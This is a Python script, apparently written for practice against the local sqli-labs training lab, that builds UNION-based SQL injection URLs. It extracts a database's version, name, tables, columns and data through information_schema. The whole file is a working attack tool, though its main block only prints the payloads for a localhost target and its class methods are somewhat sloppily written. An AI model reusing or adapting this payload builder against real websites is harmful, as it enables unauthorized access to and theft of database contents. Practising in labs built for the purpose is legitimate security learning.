import requests

class exploit():
    #string_common='union select'        #爆库必备字符串
    #string_note='--+'                   #注释
    #string_database='database()'        #爆出数据库
    #string_version='version()'          #爆出版本
    #string_tables='group_concat(TABLE_NAME) from information_schema.tables where table_schema='  #爆出表
    #string_columns='group_concat(COLUMN_NAME) from information_schema.colunms table_name='+tables+'and table_schema='+database




    def __init__(self,url):
        self.url=url  #待检测的网址
        self.counts=0 #字段数
        self.tables=[] #表
        self.dbname=''
        self.string_counts=''



    #构造select语句
    def get_string_counts(counts):
        string_counts=[i for i in range (1,counts+1)]
        return string_counts

    #构造union语句
    def exploit_string(url,string_counts):
        string_counts1=''
        for i in range (len(string_counts)):
            string_counts1+=str(string_counts[i])
            if i<len(string_counts)-1:
                string_counts1+=','
        url=url+' union select '+string_counts1+' --+'
        return url

    #构造可以爆出版本的语句
    def exploit_version(url,position,string_counts):
        string_version='version()'          #爆出版本
        position-=1
        string_counts1=''
        string_counts[position]=string_version
        for i in range (len(string_counts)):
            string_counts1+=str(string_counts[i])
            if i<len(string_counts)-1:
                string_counts1+=','
        url=url+' union select '+string_counts1+' --+'

        return  url

    #构造可以爆出数据库的语句
    def exploit_database(url,position,string_counts):
        string_database='database()'        #爆出数据库
        position-=1
        string_counts1=''
        string_counts[position]=string_database
        for i in range (len(string_counts)):
            string_counts1+=str(string_counts[i])
            if i<len(string_counts)-1:
                string_counts1+=','
        url=url+' union select '+string_counts1+' --+'
        return  url


    #构造可以爆出表的语句
    def exploit_tables(url,position,get_database,string_counts):
        position-=1
        string_counts1=''
        string_counts[position]='group_concat(TABLE_NAME)'
        for i in range (len(string_counts)):
            string_counts1+=str(string_counts[i])
            if i<len(string_counts)-1:
                string_counts1+=','
        url=url+' union select '+string_counts1+" from information_schema.tables where table_schema='"+get_database+"' --+"

        return  url

    #构造可以爆出列的语句
    def exploit_columns(url,position,get_database,get_tables,string_counts):
        position-=1
        string_counts1=''
        string_counts[position]='group_concat(COLUMN_NAME)'
        for i in range (len(string_counts)):
            string_counts1+=str(string_counts[i])
            if i<len(string_counts)-1:
                string_counts1+=','
        url=url+' union select '+string_counts1+' from information_schema.columns where table_schema=\''+get_database+'\' and table_name=\''+get_tables+'\''+' --+'
        return  url


    #爆数据
    #参数，url，位置，数据库名，表名，列名
    def exploit_data(url,position,db_and_table,columns,string_counts):
        position-=1
        string_counts1=''
        string_counts[position]='group_concat('+str(columns)+')'
        for i in range (len(string_counts)):
            string_counts1+=str(string_counts[i])
            if i<len(string_counts)-1:
                string_counts1+=','
        url=url+' union select '+string_counts1+' from '+db_and_table+' --+'
        return  url





if __name__ == '__main__':



    url="http://localhost/sqli-labs-master/Less-1/?id=1' and 1=2"

    counts=3
    position=2

    string_counts=exploit.get_string_counts(counts)

    print(string_counts)
    print('语句')
    print(exploit.exploit_string(url,string_counts))
    print('获取数据库版本语句')
    print(exploit.exploit_version(url,position,string_counts))
    print('获取数据库名语句')
    print(exploit.exploit_database(url,position,string_counts))
    print('获取表语句')
    db='security'
    print(exploit.exploit_tables(url,position,db,string_counts))
    table='users'
    print('获取列语句')
    print(exploit.exploit_columns(url,position,db,table,string_counts))






